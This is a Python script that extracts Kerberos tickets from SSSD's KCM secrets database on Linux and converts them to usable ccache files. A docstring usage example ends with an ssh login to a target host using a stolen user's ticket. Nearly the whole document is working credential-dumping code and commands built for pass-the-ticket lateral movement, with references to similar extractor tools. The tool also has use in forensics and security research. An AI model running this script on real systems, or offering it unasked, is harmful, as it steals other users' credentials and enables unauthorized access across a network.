#!/usr/bin/env python3

"""
$ apt install python3-construct python3-ldb
$ python3 kcmdump.py /var/lib/sss/secrets/secrets.ldb
$ ls -lh
-rw-r--r--. 1 root root 1.3K Jan 1 00:00 user_0.ccache
-rw-r--r--. 1 root root 1.8K Jan 1 00:00 kcmdump.py
$ KRB5CCNAME=user_0.ccache klist
$ KRB5CCNAME=user_0.ccache ssh user@corp.local@target.corp.local

References:
- https://sssd.io/release-notes/sssd-2.0.0.html
- https://github.com/SSSD/sssd/tree/master/src/responder/kcm
- https://web.mit.edu/kerberos/www/krb5-latest/doc/formats/ccache_file_format.html
- https://github.com/mandiant/SSSDKCMExtractor
- https://github.com/blacklanternsecurity/KCMTicketFormatter
"""

from argparse import ArgumentParser
from struct import pack

from construct import Struct, this, Byte, Bytes, Int8ul, Int32ul, Array, PascalString
from ldb import Ldb

KCM_BASEDN = 'cn=kcm'
CCACHE_HEADER = '0504000c00010008ffffffff00000000'


Cred = Struct(
    'uuid' / Array(16, Byte),
    'blob_len' / Int32ul,
    'blob' / Bytes(this.blob_len)
)


KCMCCache = Struct(
    'kdc_offset' / Int32ul,
    'principal_presence' / Int8ul,
    'realm' / PascalString(Int32ul, 'utf-8'),
    'type' / Int32ul,
    'principals_len' / Int32ul,
    'principals' / Array(this.principals_len, PascalString(Int32ul, 'utf-8')),
    'creds_len' / Int32ul,
    'creds' / Array(this.creds_len, Cred)
)


def dump(database):

    db = Ldb(database)
    containers = db.search(base=KCM_BASEDN, expression='type=container', attrs=['dn']).msgs

    for i, container in enumerate(containers):
        secrets = db.search(container.dn, expression='secret=*', attrs=['secret']).msgs

        for j, secret in enumerate(secrets):
            secret = secret['secret'].get(0)
            kcm_cc = KCMCCache.parse(secret)

            with open(f'{kcm_cc.principals[0]}_{i*j+j}.ccache', 'wb') as ccache:

                # 1. Header
                ccache.write(bytes.fromhex(CCACHE_HEADER))

                # 2. Default principal
                ccache.write(pack('>I', kcm_cc.type))
                ccache.write(pack('>I', kcm_cc.principals_len))
                ccache.write(pack('>I', len(kcm_cc.realm)))
                ccache.write(kcm_cc.realm.encode())
                for principal in kcm_cc.principals:
                    ccache.write(pack('>I', len(principal)))
                    ccache.write(principal.encode())

                # 3. Credentials
                for cred in kcm_cc.creds:
                    ccache.write(cred.blob)


if __name__ == '__main__':
    parser = ArgumentParser(description='KCM Dumper')
    parser.add_argument('database', help='path to the KCM secrets database')
    args = parser.parse_args()
    dump(args.database)
